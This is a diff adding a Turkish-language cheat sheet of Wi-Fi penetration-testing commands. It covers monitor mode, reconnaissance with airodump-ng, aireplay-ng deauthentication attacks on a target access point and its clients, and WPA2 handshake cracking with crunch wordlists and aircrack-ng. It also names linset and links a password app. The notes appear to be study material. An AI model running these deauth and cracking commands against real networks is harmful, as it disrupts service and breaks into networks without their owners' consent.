@@ -1,0 +1,75 @@
+Wireshark İnceleme ***
+icmp && data.len > 63 and icmp contains net
+tcp contains "ssh"
+tcp.stream eq 9wlan.fc.type_subtype == 0x000c  --- kodu wlan da deauth varmı yokmu 
+
+Monitor Moda Alma Adımı ***
+iwconfig				# Kablosuz ağ kartlarını görmemizi sağlayan komuttur.
+
+airmon-ng				# Bu komut dosyası, kablosuz arabirimlerde monitör modunu 						# etkinleştirmek için kullanılabilir. Monitör modundan yönetilen 						# moda geri dönmek için de kullanılabilir.
+
+airmon-ng check kill  			# Kablosuz ağ kartının ilişkili olduğu processleri sonlandırıyor.
+
+airmon-ng start wlan0 			# monitor moda almaya yarar.
+airmon-ng stop wlan0mon			# monitor moddan çıkartır.
+
+ifconfig wlan0 down			# Wlan0 ağ kartını pasif hale getirdi.
+iwconfig wlan0 mode Monitor		# Wlan0 ağ karını monitor moda alıyor.
+ifconfig wlan0 up			# ağ kartını enable ediyor.
+
+
+ifconfig wlan0 down
+iw wlan0 set monitor none
+ifconfig wlan0 up
+
+iw dev					#
+
+Bilgi Toplama Adımı ***
+
+airodump-ng wlan0
+airodump-ng wlan0 --essid-regex '(?i)^pc' --uptime
+airodump-ng wlan0 --channel 1,6,11,9 --manufacturer
+airodump-ng wlan0 -c 9 --bssid 98:E3:32:12:FD:6F -w Pentest
+
+Windows Sistemlerde Network Hakkında Bilgi Toplamak
+
+
+netsh wlan show network mode=bssid
+
+
+İstemcilere Yönelik Saldırılar Gerçekleştirme ***
+
+airodump-ng wlan0 -- Hedef mac adresini öğrendik ve Hangi kanalda olduğunu öğrendik.
+iwconfig wlan0 channel 1 -- Hedef ile aynı kanala geçtik.
+aireplay-ng --deauth 0 -a MACADRES wlan0
+aireplay-ng --deauth 10 -a MACADRES -c MACADRES wlan0
+
+aircrack-ng Pentest.cap
+
+crunch 9 9 '1234567890' -t abcçdefgğhıijklmnoöprsştuüvyz@@@@ -o wpa2pentest.txt
+head -n 12 wpa2pentest.txt
+aircrack-ng Pentest.cap -w wpa2pentest.txt -0
+
+
+linset ***
+
+https://apps.apple.com/us/app/wifi-map-passwords-for-free/id548925969
+wifi maps kraker
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
